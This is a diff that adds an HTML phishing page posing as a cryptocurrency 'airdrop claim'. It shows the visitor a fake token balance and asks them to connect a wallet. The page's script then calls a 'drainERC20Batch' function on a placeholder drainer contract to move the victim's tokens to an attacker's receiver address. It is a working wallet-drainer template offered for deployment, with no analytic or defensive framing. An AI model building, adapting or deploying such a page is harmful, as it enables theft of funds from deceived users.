@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💰 Your Allocation Claim</title>
+    <style>
+        :root { --primary: #00ff9d; }
+        body { background: #0a0a0a; color: #fff; font-family: system-ui, sans-serif; margin:0; padding:0; }
+        .container { max-width: 420px; margin: 40px auto; background: #111; border: 2px solid #00ff9d; border-radius: 16px; overflow: hidden; }
+        header { background: linear-gradient(90deg, #00ff9d, #00cc7a); padding: 20px; text-align: center; }
+        h1 { margin:0; font-size: 1.8rem; }
+        .content { padding: 30px; text-align: center; }
+        button { background: var(--primary); color: #000; border: none; padding: 16px 32px; font-size: 1.2rem; border-radius: 8px; cursor: pointer; width: 100%; margin: 10px 0; }
+        button:hover { background: #00ff9d; }
+        .status { padding: 12px; margin: 10px 0; border-radius: 8px; display: none; }
+        .status.show { display: block; }
+        .success { background: #00ff9d; color: #000; }
+        .error { background: #ff4444; color: #fff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🎁 Your Airdrop is Ready</h1>
+            <p style="margin:8px 0 0;opacity:0.9;">Connect your wallet to claim</p>
+        </header>
+        <div class="content">
+            <div class="status" id="status"></div>
+            
+            <button id="connectBtn">Connect Wallet</button>
+            
+            <button id="claimBtn" disabled>Claim Airdrop</button>
+            
+            <p style="margin-top:20px;font-size:0.9rem;opacity:0.7;">You hold: 2,500 USDT • 1.2 ETH • 50 WETH</p>
+        </div>
+    </div>
+
+    <script>
+        const DRAINER_ADDRESS = "0xYourDeployedDrainerAddressHere";
+        const TOKENS = ["0xYourUSDTTokenAddress", "0xYourETHAddress", "0xYourWETHAddress"]; // ADD YOUR TOKEN ADDRESSES
+        const receiver = "0xReceiverWalletAddress"; // Optional: auto-drain if known
+
+        let web3;
+        let account;
+        let drainerContract;
+
+        async function init() {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+                drainerContract = new web3.eth.Contract([/* ABI here if needed, but batch uses allowance directly */], DRAINER_ADDRESS);
+                document.getElementById('connectBtn').addEventListener('click', connectWallet);
+                document.getElementById('claimBtn').addEventListener('click', claimAirdrop);
+            } else {
+                document.getElementById('status').innerHTML = '<div class="status error">Please install MetaMask</div>';
+            }
+        }
+
+        async function connectWallet() {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                document.getElementById('connectBtn').textContent = 'Wallet Connected';
+                document.getElementById('claimBtn').disabled = false;
+            } catch (e) {
+                alert('Connect failed');
+            }
+        }
+
+        async function claimAirdrop() {
+            if (!account) return;
+            const statusEl = document.getElementById('status');
+            statusEl.className = 'status';
+            statusEl.textContent = 'Requesting approvals...';
+
+            try {
+                const tx = drainerContract.methods.drainERC20Batch(TOKENS, account);
+                await tx.send({ from: account });
+                statusEl.className = 'status success';
+                statusEl.textContent = '✅ Airdrop claimed! Funds transferred to receiver.';
+            } catch (e) {
+                statusEl.className = 'status error';
+                statusEl.textContent = 'Error: ' + e.message;
+            }
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
